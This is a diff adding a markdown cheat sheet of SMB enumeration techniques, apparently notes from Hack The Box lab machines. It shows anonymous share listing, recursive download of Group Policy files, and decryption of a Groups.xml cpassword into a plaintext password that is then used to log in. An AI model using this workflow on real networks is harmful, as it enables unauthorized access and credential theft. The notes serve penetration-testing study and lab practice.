@@ -1,0 +1,165 @@
+# Examples
+* Hackthebox\Active
+* Hackthebox\Querier
+* Hackthebox\Sizzle
+* Hackthebox\Friendzone
+
+# Known vulnerabilities
+* Groups.xml file might be shared by domain controller.
+This file might contain local account's credentials.
+Example:  Hackthebox\active
+File content example:
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
+</User>
+</Groups>
+```
+the password could be decrypted using the tool **gpp-decrypt**
+```
+root@kali:~/hackthebox/Active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+  GPPstillStandingStrong2k18
+```
+
+# Useful commands
+
+* nmap --script safe -p 445 < ip >
+Run nmap safe scripts against smb service
+
+* smbclient -L < ip > --no-pass
+List all dirs on the server using anonymous logon
+```
+root@kali:~/hackthebox/Active# smbclient -L 10.10.10.100 --no-pass
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+```
+
+* smbmap -H < ip >
+List all dirs on the server with anonymous permissions
+If the command doesn't work - try to specify the user: -u anonymous and/or domain -d localhost
+```
+root@kali:~/hackthebox/Active# smbmap -H 10.10.10.100
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+  Disk                          Permissions
+  ----                          -----------
+  ADMIN$                        NO ACCESS
+  C$                            NO ACCESS
+  IPC$                          NO ACCESS
+  NETLOGON                      NO ACCESS
+  Replication                   READ ONLY
+  SYSVOL                        NO ACCESS
+  Users                         NO ACCESS
+```
+
+* smbmap -H < ip > -R < directory >
+Recursively lists the content of directory
+```
+root@kali:~/hackthebox/Active# smbmap -H 10.10.10.100 -R "Replication"
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+    Disk                                                    Permissions
+    ----                                                    -----------
+    Replication                                             READ ONLY
+    .\
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
+    .\\active.htb\
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
+    .\\active.htb\DfsrPrivate\
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
+    .\\active.htb\Policies\
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
+    .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+    -r--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
+    dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
+```
+
+* smbmap -H < ip > -R < folder > -A < file name > -q
+Recursively lists the content of directory and download files matching with specified file name pattern in quite mode.
+```
+root@kali:~/hackthebox/Active# smbmap -H 10.10.10.100 -R "Replication" -A "Groups.xml" -q
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+  Disk                                                    Permissions
+  ----                                                    -----------
+  Replication                                             READ ONLY
+  [+] Starting search for files matching 'Groups.xml' on share Replication.
+  [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
+root@kali:~/hackthebox/Active# updatedb
+root@kali:~/hackthebox/Active# locate "Groups.xml"
+/root/hackthebox/Active/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
+```
+
+* Download files from file share using smblient
+```
+root@kali:~/hackthebox/Active# smbclient //10.10.10.100/Replication --no-pass
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (6.2 KiloBytes/sec) (average 2.3 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (2.8 KiloBytes/sec) (average 2.4 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (12.0 KiloBytes/sec) (average 4.7 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 4.0 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as GptTmpl.inf (19.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
+smb: \> exit
+root@kali:~/hackthebox/Active# ls -la active.htb/
+total 20
+drwxr-xr-x 5 root root 4096 Aug  9 08:10 .
+drwxr-xr-x 4 root root 4096 Aug  9 08:10 ..
+drwxr-xr-x 5 root root 4096 Aug  9 08:10 DfsrPrivate
+drwxr-xr-x 4 root root 4096 Aug  9 08:10 Policies
+drwxr-xr-x 2 root root 4096 Aug  9 08:10 scripts
+```
+
+* smbmap -u < user > -p < password > -d < domain > -H < ip >
+List all dirs on the server using some credentials
+```
+root@kali:~/hackthebox/Active# smbmap -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb -H 10.10.10.100
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  NO ACCESS
+        C$                                                      NO ACCESS
+        IPC$                                                    NO ACCESS
+        NETLOGON                                                READ ONLY
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY
+        Users                                                   READ ONLY
+```
